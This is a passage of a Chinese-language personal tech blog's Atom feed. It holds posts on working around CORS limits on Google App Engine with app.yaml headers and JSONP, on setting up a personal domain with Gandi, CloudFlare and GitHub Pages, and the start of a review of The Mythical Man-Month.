&lt;h4&gt;3. &lt;a href="https://www.w3.org/TR/cors/"&gt;Cross-Origin Resource Sharing&lt;/a&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This document defines a mechanism to enable client-side cross-origin requests. Specifications that enable an API to make cross-origin requests to resources can use the algorithms defined by this specification. If such an API is used on http://example.org resources, a resource on http://hello-world.example can opt in using the mechanism described by this specification (e.g., specifying Access-Control-Allow-Origin: http://example.org as response header), which would allow that resource to be fetched cross-origin from http://example.org.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;5.1 Access-Control-Allow-Origin Response Header&lt;br /&gt;
The Access-Control-Allow-Origin header indicates whether a resource can be shared based by returning the value of the Origin request header, "*", or "null" in the response. ABNF:&lt;br /&gt;
&lt;code&gt;Access-Control-Allow-Origin = "Access-Control-Allow-Origin" ":" origin-list-or-null | "\*"&lt;/code&gt;&lt;br /&gt;
Note: In practice the origin-list-or-null production is more constrained. Rather than allowing a space-separated list of origins, it is either a single origin or the string "null".  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以直接從文件看來，&lt;br /&gt;
W3C 當初設計上其實是允許多個 domain 的，&lt;br /&gt;
只要以空白分隔就行。&lt;br /&gt;
但 Note 的部份就提到了一個重點，&lt;br /&gt;
實作上通常只允許單一 domain 或是 &lt;code&gt;"*"&lt;/code&gt; 而已，&lt;br /&gt;
不允許用空白分隔多個 domain 形成的 origin-list，&lt;br /&gt;
這個原因我也不懂，&lt;br /&gt;
但造成我不小的問題就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Solution of Google App Engine for CORS&lt;/h2&gt;
&lt;h3&gt;&lt;a href="https://cloud.google.com/appengine/docs/python/config/appref"&gt;app.yaml Reference | App Engine standard environment for Python | Google Cloud Platform&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;CORS Support  &lt;/p&gt;
&lt;p&gt;One important use of this feature is to support cross-origin resource sharing (CORS), such as accessing files hosted by another App Engine app.  &lt;/p&gt;
&lt;p&gt;For example, you could have a game app mygame.appspot.com that accesses assets hosted by myassets.appspot.com. However, if mygame attempts to make a JavaScript XMLHttpRequest to myassets, it will not succeed unless the handler for myassets returns an Access-Control-Allow-Origin: response header containing the value http://mygame.appspot.com.  &lt;/p&gt;
&lt;p&gt;Here is how you would make your static file handler return that required response header value:  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;handlers:  
- url: /images  
  static_dir: static/images  
  http_headers:  
    Access-Control-Allow-Origin: http://mygame.appspot.com&lt;/code&gt;&lt;br /&gt;
Note: if you wanted to allow everyone to access your assets, you could use the wildcard '*', instead of http://mygame.appspot.com.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這邊並沒有提到能不能使用空白分隔的 origin-list，&lt;br /&gt;
但我記得我試過，&lt;br /&gt;
結果是不行的，&lt;br /&gt;
所以後來我採用下面的解法，&lt;br /&gt;
仍然是只能設定成 &lt;code&gt;"*"&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;app.yaml&lt;/code&gt; 中，&lt;br /&gt;
針對 static files 的 handler 加上 &lt;code&gt;http_headers&lt;/code&gt;，&lt;br /&gt;
並在其中加入 &lt;code&gt;Access-Control-Allow-Origin: "*"&lt;/code&gt;，&lt;br /&gt;
讓所有其他 domain 的 script 都可以 request 這些 static files (assets)。  &lt;/p&gt;
&lt;p&gt;改完之後的 &lt;code&gt;app.yaml&lt;/code&gt; 其中部份會長得像是這樣：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;url&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;/(.*)$&lt;/span&gt;  
   &lt;span class="l l-Scalar l-Scalar-Plain"&gt;static_files&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;static/\1&lt;/span&gt;  
   &lt;span class="l l-Scalar l-Scalar-Plain"&gt;upload&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;static/.*$&lt;/span&gt;  
   &lt;span class="l l-Scalar l-Scalar-Plain"&gt;http_headers&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
      &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Questions&lt;/h2&gt;
&lt;p&gt;顯然把 allow domain 設定成 &lt;code&gt;"*"&lt;/code&gt; 允許所有其他 domain 不是件好事，&lt;br /&gt;
理想上當然是只允許 subdomain 就好，&lt;br /&gt;
但我在找尋相關解法的時候沒有找到這樣的用法。&lt;br /&gt;
看到的解答都是 &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; 只能允許使用一個寫死的 domain 或是 &lt;code&gt;"*"&lt;/code&gt;。  &lt;/p&gt;
&lt;p&gt;Apache 和 Nginx 都可以針對這個部份做設定，&lt;br /&gt;
例如這兩篇都有提到作法：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://rustyrazorblade.com/2013/10/cors-with-wildcard-subdomains-using-nginx/"&gt;CORS with Wildcard Subdomains Using Nginx — Rustyrazorblade&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.blakesimpson.co.uk/read/64-apache-configure-cors-headers-for-whitelist-domains"&gt;Apache Configure CORS Headers for Whitelist Domains&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;似乎是回一個寫死 domain 的 &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; 的 HTTP Header，&lt;br /&gt;
但是可以在設定檔裏面做設定，&lt;br /&gt;
如果 request 是來自允許的 domain 的話，&lt;br /&gt;
就把 &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; 的值設定成該 domain，&lt;br /&gt;
如果不在白名單裡面的話當然就擋掉。  &lt;/p&gt;
&lt;p&gt;Google App Engine 這邊也只能幫忙加上 header，&lt;br /&gt;
如果 Google App Engine 的使用者想針對這部份做進一步的設定的話，&lt;br /&gt;
我目前的想法是只能用 Flexiable Environment，&lt;br /&gt;
前面架個 Apache 或 Nginx 來解掉這問題，&lt;br /&gt;
但我還沒試過就是，&lt;br /&gt;
因為後來又有其他事情得做，&lt;br /&gt;
所以這個 CDN 就暫時開發到這邊而已。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Postscript&lt;/h2&gt;
&lt;p&gt;弄這個 CDN 大約是6月底的事，&lt;br /&gt;
所以算來也差不多兩個月了，&lt;br /&gt;
直到最近又遇到了一次 CORS 的問題。  &lt;/p&gt;
&lt;p&gt;主要是公司有些功能想要實作，&lt;br /&gt;
會需要在客戶的網站上呼叫我們自家公司的 API，&lt;br /&gt;
同事嘗試了以後就遇到 CORS 的問題然後跑來問我。&lt;br /&gt;
因為 API 也是跑在 Google App Engine，&lt;br /&gt;
所以我第一時間就想到在該 API 的 url handler 加上 http_headers。&lt;br /&gt;
但加上去以後用 &lt;code&gt;appcfg.py&lt;/code&gt; 要 deploy 的時候遇到了下面這個錯誤，  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;appcfg.py: error: Error parsing ./app.yaml: Unexpected attribute &amp;quot;http_headers&amp;quot; for mapping type script.  
  in &amp;quot;./app.yaml&amp;quot;, line 70, column 1.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看來 Google App Engine 不允許對非 static files 的 handler 加上 HTTP Headers，&lt;br /&gt;
於是只好另尋出路。  &lt;/p&gt;
&lt;p&gt;想了一下，&lt;br /&gt;
依稀記得之前在處理這個問題的時候好像有看到 JSONP 可以跳過一些跨域名請求的限制，&lt;br /&gt;
於是找到了這篇 &lt;a href="https://stackoverflow.com/questions/28359730/google-place-api-no-access-control-allow-origin-header-is-present-on-the-req"&gt;javascript - Google Place API - No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'null' is therefore not allowed access - Stack Overflow&lt;/a&gt;&lt;br /&gt;
底下有一個回應給出了解答，&lt;br /&gt;
可以透過 jQuery 的 &lt;code&gt;$.ajax()&lt;/code&gt; 跳過 CORS 的限制，&lt;br /&gt;
直接拿到 Cross-Domain 的 JSON API 的結果。  &lt;/p&gt;
&lt;p&gt;作法如下：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ajax&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;  
    &lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;$url_of_api&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="nx"&gt;dataType&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jsonp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="nx"&gt;cache&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="nx"&gt;success&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;  
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="p"&gt;}&lt;/span&gt;  
&lt;span class="p"&gt;});&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中把 &lt;code&gt;$url_of_api&lt;/code&gt; 換成會回傳 JSON 結果的 Cross-Domain API 的網址就行了，&lt;br /&gt;
我把這個事件叫作「JSONP 拯救 Cross-Domain JSON API Request」。(啥  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Access-Control-Allow-Origin"&gt;HTTP access control (CORS) - HTTP | MDN&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/storage/docs/cross-origin#client_side_support"&gt;Cross-Origin Resource Sharing (CORS) | Cloud Storage | Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/17555269/access-control-allow-origin-header-on-google-app-engine"&gt;python - Access-Control-Allow-Origin header on Google App Engine - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.w3.org/TR/cors/"&gt;Cross-Origin Resource Sharing&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://rustyrazorblade.com/2013/10/cors-with-wildcard-subdomains-using-nginx/"&gt;CORS with Wildcard Subdomains Using Nginx — Rustyrazorblade&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.blakesimpson.co.uk/read/64-apache-configure-cors-headers-for-whitelist-domains"&gt;Apache Configure CORS Headers for Whitelist Domains&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/docs/python/config/appref"&gt;app.yaml Reference | App Engine standard environment for Python | Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/28359730/google-place-api-no-access-control-allow-origin-header-is-present-on-the-req"&gt;javascript - Google Place API - No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'null' is therefore not allowed access - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="W3C"></category><category term="HTTP"></category><category term="CORS"></category><category term="Cross-Origin HTTP Request"></category><category term="Google App Engine"></category></entry><entry><title>買了一個叫作 m157q.tw 的域名</title><link href="https://blog.m157q.tw/posts/2016/09/06/i-bought-my-first-domain-name/" rel="alternate"></link><published>2016-09-19T21:52:00+08:00</published><updated>2016-09-19T21:52:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-06:posts/2016/09/06/i-bought-my-first-domain-name/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;今年 6/13 的時候一時心血來潮就買了，&lt;br /&gt;
Domain Name 是 &lt;code&gt;m157q.tw&lt;/code&gt;。&lt;br /&gt;
從 &lt;a href="https://www.gandi.net/"&gt;Gandi&lt;/a&gt; 那邊買的，&lt;br /&gt;
因為之前還蠻常看到 Gandi 出現在 Conf 的攤位擺攤的，&lt;br /&gt;
想說就用用看他們家的服務。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;*.tw&lt;/code&gt; 域名的價錢我覺得不貴，&lt;br /&gt;
一年沒記錯的話好像新臺幣六七百塊而已。  &lt;/p&gt;
&lt;p&gt;算一算用了也快 3 個月了，&lt;br /&gt;
當時就想寫篇文章稍微紀錄一下，&lt;br /&gt;
但身為一個拖延症患者，&lt;br /&gt;
就一直拖到了現在。  &lt;/p&gt;
&lt;p&gt;其實買了以後大概也只有 &lt;code&gt;blog.m157q.tw&lt;/code&gt; 有在用，&lt;br /&gt;
就是為了這個 blog 罷了，&lt;br /&gt;
但想說之後有什麼東西要用的話，&lt;br /&gt;
也可以 DNS record 設定一下就可以放在自己的 domain 底下，&lt;br /&gt;
而且身為一個寫程式跟管 Server 的人，&lt;br /&gt;
買個自己的 Domain Name 來用應該是件很合理的事？&lt;br /&gt;
其實以前就想買了，&lt;br /&gt;
只是窮學生沒什麼收入，&lt;br /&gt;
現在有在工作有點收入後，&lt;br /&gt;
就覺得不是啥太大的負擔了。  &lt;/p&gt;
&lt;p&gt;因為用到 GitHub Pages, Gandi, CloudFlare 三個服務，&lt;br /&gt;
所以以下稍微紀錄一下。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;GitHub 相關&lt;/h2&gt;
&lt;p&gt;因為這個 blog 是透過 GitHub Pages 架設的 static site，&lt;br /&gt;
要在 master branch 新增一個 &lt;code&gt;CNAME&lt;/code&gt; 的檔案，&lt;br /&gt;
內容則是這個 GitHub Pages 的 Custom Domain，&lt;br /&gt;
&lt;a href="https://github.com/M157q/m157q.github.io/blob/master/CNAME"&gt;我的話當然就是放 &lt;code&gt;blog.m157q.tw&lt;/code&gt;&lt;/a&gt;，  &lt;/p&gt;
&lt;p&gt;設定好的話，&lt;br /&gt;
連到原本的 GitHub Pages 預設的 Domain Name，&lt;br /&gt;
就會幫你 redirect 到 Custom Domain 去。&lt;br /&gt;
例如：&lt;a href="https://m157q.github.io"&gt;https://m157q.github.io&lt;/a&gt; 現在就會直接被導到 &lt;a href="https://blog.m157q.tw"&gt;https://blog.m157q.tw&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;詳細的 GitHub 官方說明文件在此： &lt;a href="https://help.github.com/articles/using-a-custom-domain-with-github-pages/"&gt;Using a custom domain with GitHub Pages - User Documentation&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Gandi 相關&lt;/h2&gt;
&lt;p&gt;Gandi 的 web admin interface 我覺得沒有很好用，&lt;br /&gt;
速度有點慢，&lt;br /&gt;
而且帳號是 Gandi 把申請人姓名取兩個英文字母簡寫再加上四個數字的流水號，&lt;br /&gt;
然後後面還要加上 &lt;code&gt;-GANDI&lt;/code&gt;，&lt;br /&gt;
所以我每次要登入的時候都忘記帳號，&lt;br /&gt;
都要跑去信箱打開信件查閱。&lt;br /&gt;
雖然他們家在社群攤位每次主打的都是 CLI 介面，&lt;br /&gt;
但我沒用過，&lt;br /&gt;
之後有機會可能會用用看。  &lt;/p&gt;
&lt;p&gt;其實介面就還堪用，&lt;br /&gt;
但有個很重要的功能我覺得需要提一下，&lt;br /&gt;
就是把 Domain Name 申請人資料隱藏的選項。&lt;br /&gt;
發現好多人買完好像都沒勾選這個選項，&lt;br /&gt;
導致個人資訊只要一用 &lt;code&gt;whois&lt;/code&gt; 就全部洩漏了。&lt;br /&gt;
這個選項的位置在 Admin Interface 裡頭：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Account management&lt;/code&gt; &amp;gt; &lt;code&gt;Update account information&lt;/code&gt;&lt;br /&gt;
裏面有一欄 &lt;code&gt;Private Domain Registration&lt;/code&gt;&lt;br /&gt;
請記得勾選 &lt;code&gt;Yes&lt;/code&gt;&lt;br /&gt;
然後儲存就行了。&lt;br /&gt;
（其實好像在填寫申請資料的時候就可以勾選了）  &lt;/p&gt;
&lt;p&gt;印象中要等一下子才會生效。&lt;br /&gt;
之後用 &lt;code&gt;whois&lt;/code&gt; 查詢自己的 domain name 的話，&lt;br /&gt;
就只會出現本名，&lt;br /&gt;
還有 Gandi assign 的 email，&lt;br /&gt;
似乎會幫忙轉信到你真正的信箱。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;CloudFlare 相關&lt;/h2&gt;
&lt;p&gt;CloudFlare 是因為公司裡頭的服務有用到而接觸，&lt;br /&gt;
使用了以後覺得還滿好用的，&lt;br /&gt;
我覺得後台的介面設計的蠻簡單易用的，&lt;br /&gt;
而且說明也很好找，&lt;br /&gt;
就在每個功能旁邊都有個 Help，&lt;br /&gt;
不懂這個功能在幹嘛的話點下去就對了，&lt;br /&gt;
而且說明我覺得滿詳細的。  &lt;/p&gt;
&lt;p&gt;預設的免費版就有很多好用的功能，&lt;br /&gt;
主要比較常用到的就是以下幾個功能：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DNS  &lt;ul&gt;
&lt;li&gt;設定非常方便，我就是直接把 Gandi 的 DNS delegate 給 CloudFlare 這邊做管理。  &lt;/li&gt;
&lt;li&gt;透過後台可以馬上做設定，而且生效極快。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CDN + Cache  &lt;ul&gt;
&lt;li&gt;非常強大，而且今年已經在臺北有 Node（與中華電信合作），所以存取速度大增。  &lt;/li&gt;
&lt;li&gt;（2016/09/19 更新）目前因為中華電信的費用實在太貴，所以 CloudFlare 把 Free 跟 Pro User 的台灣流量都導到美西去了，&lt;a href="https://twitter.com/ihower/status/777723975300321280"&gt;說是只有 Business User 才能使用台北的 Node&lt;/a&gt;。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.cloudflare.com/bandwidth-costs-around-the-world/"&gt;https://blog.cloudflare.com/bandwidth-costs-around-the-world/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;之前看到這篇的時候沒有仔細看，以為只有單純婊中華電信和其他國家的五家電信很貴。(六家電信在 CloudFlare 總流量只有 6% 卻佔頻寬費用將近 50%)  &lt;blockquote&gt;
&lt;p&gt;Today, however, there are six expensive networks (HiNet, Korea Telecom, Optus, Telecom Argentina, Telefonica, Telstra) that are more than an order of magnitude more expensive than other bandwidth providers around the globe and refuse to discuss local peering relationships. To give you a sense, these six networks represent less than 6% of the traffic but nearly 50% of our bandwidth costs.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;沒想到裏面有提及，會把 CloudFlare 免費版使用者有用到這六家電信的流量導到其他費用比較合理的國家，直到這六家電信的費用有變便宜才會再做考慮。  &lt;blockquote&gt;
&lt;p&gt;While we’ve tried to engage all these providers to reduce their extremely high costs and ensure that even our Free customers can be served across their networks, we’ve hit an impasse. To that end, unfortunately, we’ve made the decision that the only thing that will change these providers’ pricing is to make it clear how out of step they are with the rest of the world. To demonstrate this, we’ve moved our Free customers off these six transit providers. Free customers will still be accessible across our network and served from another regional cache with more reasonable bandwidth pricing.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;剛剛用 &lt;a href="https://github.com/cloudflare/claire"&gt;Claire&lt;/a&gt; 看了一下 blog，的確從原本台北的 node 變成 Los Angeles 的 node 了，所以 ping 的 latency 升到了 180 ms 左右。blog 好像還好，不過公司的 service 影響可能比較大就是了，雖然之前台北沒 node 的時候公司好像還是照用 CloudFlare 就是了。所以應該沒差吧（？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;免費的 HTTPS  &lt;ul&gt;
&lt;li&gt;這部份本來使用 GitHub Pages 就有 HTTPS 了。  &lt;/li&gt;
&lt;li&gt;在 Crypto 的 SSL 設定要設定成 Full，設定成 Full(strict) 我記得是會有問題的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Analytics  &lt;ul&gt;
&lt;li&gt;簡單的流量分析，主要是讓你檢視 CloudFlare 幫你 Cache 了多少流量，還有其他圓餅圖。  &lt;/li&gt;
&lt;li&gt;免費版只能查看最近 24 小時、最近 1 個禮拜和最近 1 個月的資料，但我覺得已經夠用了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其他還有像是：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Auto Minify JavaScript, CSS, HTML  &lt;/li&gt;
&lt;li&gt;HTTP/2+SPDY  &lt;/li&gt;
&lt;li&gt;免費版可以設定 3 條 Page (Rewrite) Rules  &lt;/li&gt;
&lt;li&gt;也有 Firewall 可以設定，但因為我是用 static site，沒啥好擔心的，所以目前沒用到。  &lt;/li&gt;
&lt;li&gt;自動幫你擋掉一些惡意攻擊  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我的設定大致上跟 &lt;a href="https://blog.cloudflare.com/secure-and-fast-github-pages-with-cloudflare/"&gt;CloudFlare 官方 Blog 這篇文章&lt;/a&gt;差不多，&lt;br /&gt;
差別只在於文章裡面的 static site generator 是用 Jekyll，&lt;br /&gt;
但我是用 Pelican。  &lt;/p&gt;
&lt;p&gt;然後查了一下有人說掛上 CloudFlare 以後，&lt;br /&gt;
使用 Disqus 和 Google Analytics 會有問題，&lt;br /&gt;
主要是因為等同掛了 proxy，&lt;br /&gt;
所以 Disqus 的留言者 IP 和 Google Analytics 的 IP 來源判斷會有問題，&lt;br /&gt;
但我觀察了一下是沒有遇到這問題就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;我覺得現在這樣還挺方便的，&lt;br /&gt;
搭配之前設定的 &lt;a href="/posts/2016/05/08/use-travis-ci-to-publish-pelican-blog-on-github-pages-automatically/"&gt;Travis CI 自動化發佈 blog&lt;/a&gt;，&lt;br /&gt;
真的就不用登入後台，&lt;br /&gt;
所以沒有網路也可以寫。&lt;br /&gt;
（當然像 Hexo 那類 run local server 然後進去 local server 的 admin interface 也不用連網就是）&lt;br /&gt;
但因為用 Markdown 習慣了，&lt;br /&gt;
也不需要啥語法輔助或是所見即所得編輯器，&lt;br /&gt;
然後用 Vim 也用習慣了，&lt;br /&gt;
不太想空出一隻手去操控滑鼠，&lt;br /&gt;
所以現在就可以開心用 Vim 寫 blog，&lt;br /&gt;
還有用 Git 幫自己的 blog 做版本控制。  &lt;/p&gt;
&lt;p&gt;也不用擔心哪個 blog 服務要關閉，&lt;br /&gt;
就算 GitHub Pages 要關閉了，&lt;br /&gt;
我也可以很容易的自己 serve 一個 static site，&lt;br /&gt;
我覺得挺好的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://help.github.com/articles/using-a-custom-domain-with-github-pages/"&gt;Using a custom domain with GitHub Pages - User Documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.cloudflare.com/secure-and-fast-github-pages-with-cloudflare/"&gt;Secure and fast GitHub Pages with CloudFlare&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Domain name"></category><category term="CloudFlare"></category><category term="Gandi"></category><category term="GitHub Pages"></category></entry><entry><title>《人月神話：專案管理之道》二十週年紀念版</title><link href="https://blog.m157q.tw/posts/2016/09/05/the-mythical-man-month/" rel="alternate"></link><published>2016-09-06T00:00:00+08:00</published><updated>2016-09-06T00:00:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-05:posts/2016/09/05/the-mythical-man-month/</id><summary type="html">&lt;p&gt;&lt;img alt="封面" src="/files/the-mythical-man-month/cover.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;這本是在 PyCon TW 2016 天瓏書局擺攤時買的（六月初），&lt;br /&gt;
一直到七月中才開始看，&lt;br /&gt;
八月初才看完，&lt;br /&gt;
看的速度好像真的有點慢 Orz&lt;br /&gt;
然後又拖了一個月，&lt;br /&gt;
才生出這篇文章。&lt;br /&gt;
（究竟什麼時候才能脫離拖延症患者呢？）  &lt;/p&gt;
&lt;p&gt;其實網路上要下載這本的電子書隨便找都找得到，&lt;br /&gt;
我自己也有一本，&lt;br /&gt;
但後來發現自己還是比較喜歡看實體書的感覺，&lt;br /&gt;
電子書就當作收藏吧！  &lt;/p&gt;
&lt;p&gt;二十週年紀念版新增了以下幾個章節：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第 16 章 — 沒有銀彈：軟體工程的本質性與附屬性工作  &lt;/li&gt;
&lt;li&gt;第 17 章 — 再論「沒有銀彈」  &lt;/li&gt;
&lt;li&gt;第 18 章 — 《人月神話》的主張：是真是假？  &lt;/li&gt;
&lt;li&gt;第 19 章 — 《人月神話》二十年  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;讀完以後我覺得這四個新增的章節都蠻重要的，&lt;br /&gt;
畢竟有作者自己的反思以及一些讀者的回饋，&lt;br /&gt;
非常值得邊讀邊思考，&lt;br /&gt;
我想以後再工作更長一段時間甚至是擔任管理職以後，&lt;br /&gt;
可能會對書中說的事情更有體會吧。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;作者簡介&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Fred_Brooks"&gt;Frederick Phillips Brooks, Jr.&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;曾在 IBM 管理過非常大型的 &lt;a href="https://en.wikipedia.org/wiki/OS/360_and_successors"&gt;OS/360&lt;/a&gt; 系列專案，本書就是他集結這些大型專案的開發經驗後得到的結論並分享出來。  &lt;/li&gt;
&lt;li&gt;1999 年圖靈獎得主。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;以下附上我自己讀的時候把比較喜歡的內容拍下來的照片：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="content 1" src="/files/the-mythical-man-month/1.jpg" /&gt;  &lt;ul&gt;
&lt;li&gt;公車上拍的... 窗簾有點紅...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;img alt="content 2" src="/files/the-mythical-man-month/2.jpg" /&gt;  &lt;ul&gt;
&lt;li&gt;這個比較圖不知道會不會引起戰爭  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;img alt="content 3" src="/files/the-mythical-man-month/3.jpg" /&gt;  &lt;ul&gt;
&lt;li&gt;尤其是一堆公司會讓很會寫程式的人去當管理者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;img alt="content 4" src="/files/the-mythical-man-month/4.jpg" /&gt;  &lt;ul&gt;
&lt;li&gt;覺得沒有幾間公司可以完全做到以上這幾點，而且中間還有很多變因，但真的是很理想的情況啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;img alt="content 5" src="/files/the-mythical-man-month/5.jpg" /&gt;  &lt;ul&gt;
&lt;li&gt;我也覺得流程圖真的蠻雞肋的，但即便是到了現在，好像也沒有出現什麼更好的將程式視覺化的方法？頂多就是讓流程圖變成用程式產生，但這邊的流程圖是要在程式設計之前就要事先畫好的東西，類似設計圖的概念，讓人可以提早檢驗出設計上的缺失。也許就像本書自己講的，軟體工程上的本質不同，所以要像這樣採用和其他工程學一樣預先畫出設計圖的方法可能也不太可行？而且實務上的經驗來說，頂多只能概略的畫出架構圖，但這是針對伺服器的架構，好像很少人在寫一個程式之前會先畫出流程圖的。  &lt;/li&gt;
